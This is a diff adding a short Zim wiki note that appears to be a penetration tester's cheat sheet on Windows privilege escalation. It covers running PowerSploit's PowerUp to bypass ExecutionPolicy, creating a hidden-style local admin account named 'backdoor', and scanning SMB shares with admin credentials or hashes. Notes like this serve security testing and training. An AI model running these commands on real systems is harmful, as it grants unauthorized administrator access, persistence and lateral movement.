@@ -1,0 +1,18 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-10-30T12:59:52-07:00
+
+====== Windows Privilege Escalation ======
+Created Friday 30 October 2020
+
+Copy PowerUp.ps1 from GitHub "PowerShellMafia/
+PowerSploit" into PowerShell to
+bypass ExecutionPolicy and execute Invoke-
+AllChecks. Use the abuse functions.
+Add a new local admin:
+C:\> net user backdoor P@ssw0rd23
+C:\> net localgroup Administrators
+backdoor /add
+Scan for network shares:
+# smbmap.py --host-file smbhosts.txt -
+u Administrator -p PasswordOrHash
